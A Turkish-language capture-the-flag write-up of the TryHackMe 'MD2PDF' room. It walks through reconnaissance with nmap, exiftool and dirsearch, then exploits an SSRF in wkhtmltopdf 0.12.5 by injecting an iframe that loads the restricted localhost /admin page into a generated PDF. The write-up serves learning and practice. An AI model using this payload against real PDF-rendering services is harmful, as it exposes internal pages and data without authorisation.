---
title: 'TryHackMe | MD2PDF WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [ssrf]
render_with_liquid: false
media_subpath: /images/tryhackme_md2pdf/
image:
  path: logo.webp
---

## Özet
Girilen metni PDF dosyasına yazdıran bir web uygulaması ile ilgilineceğiz. Görüntüleme yetkimizin olmadığı bir sayfayı "iframe" etiketini kullanarak görüntüleyecek ve bayrağa erişeceğiz.

## Keşif aşaması

### Nmap taraması

```console
$ nmap -sV -sC -T4 10.10.63.46
PORT   STATE SERVICE VERSION                                                                                                                                                                  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                                                             
| ssh-hostkey:                                                                                                                                                                                
|   3072 51:10:bc:71:4e:25:63:64:92:00:56:16:67:dd:7e:d9 (RSA)                                                                                                                                
|   256 64:64:e3:68:4d:0c:df:c6:cb:7c:ad:c0:a6:30:b5:f0 (ECDSA)                                                                                                                               
|_  256 ab:8b:3c:39:a0:0e:2b:fc:e1:64:e7:30:ca:16:b9:e1 (ED25519)                                                                                                                             
80/tcp open  rtsp                                                                                                                                                                             
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)  
```

#### Bulgular

- 22 (SSH): Bu port'un üzerinde OpenSSH'ın 8.2 sürümü çalışıyor.
- 80 (HTTP): Bu port'un üzerinde rtsp adında bir servis çalışıyor. Servisi internette aradığımda, medya sunucularındaki verilerin akışını kontrol etmek için tasarlanan bir ağ denetim protokolü olduğunu öğrendim.

### 80 numaralı port'un incelenmesi

![](1.webp){: width="1200" height="600" }

Girilen metni kullanarak PDF oluşturan bir web uygulaması ile karşı karşıyayız. HTML etiketlerini PDF üzerinde kullanabiliyoruz. Oluşturduğumuz PDF dosyasını indirdikten sonra exiftool ile meta verilerini görüntülediğimizde "wkhtmltopdf 0.12.5" adında bir modül kullanılarak oluşturduğunu öğreniyoruz.

```console
$ exiftool document.pdf 
ExifTool Version Number         : 12.57
File Name                       : document.pdf
Directory                       : .
File Size                       : 8.0 kB
File Modification Date/Time     : 2025:03:20 07:19:26-04:00
File Access Date/Time           : 2025:03:20 07:19:26-04:00
File Inode Change Date/Time     : 2025:03:20 07:19:26-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : 
Creator                         : wkhtmltopdf 0.12.5
Producer                        : Qt 4.8.7
Create Date                     : 2025:03:20 11:18:52Z
Page Count                      : 1
Page Mode                       : UseOutlines
```

Modülün bu sürümünde bir SSRF zafiyeti bulunuyor. HTML etiketlerinin yardımıyla sistemdeki dosyaları görüntüleyebiliyoruz. Meydan okumada istenen tek bir bayrak olduğundan bu bayrağın konumunu bulmamız gerekiyor. Sonuçta sisteme girmemiz gerekse iki veya daha fazla bayrak aramamız gerekecekti. dirsearch ile yaptığım taramanın sonucunda görüntüleme iznimizin olmadığı bir sayfa ile karşılaşıyoruz.

```console
$ dirsearch -u http://10.10.63.46/
...
[07:30:14] 403 -  166B  - /admin
...
```

![](2.webp){: width="1000" height="500" }

Gördüğünüz üzere sadece yerel ağdan görüntülenmeye çalışıldığında sayfa içeriğini görüntülüyor.

## Sömürü aşaması

HTML etiketlerinin PDF üzerinde geçerli olduğunu düşünürsek, tek yapmamız gereken şey "iframe" etiketi ile görüntüleyemediğimiz sayfayı bulunduğumuz sayfaya dahil etmektir.

```html
<iframe src="http://localhost:5000/admin"></iframe>
```

![](3.webp){: width="900" height="500" }
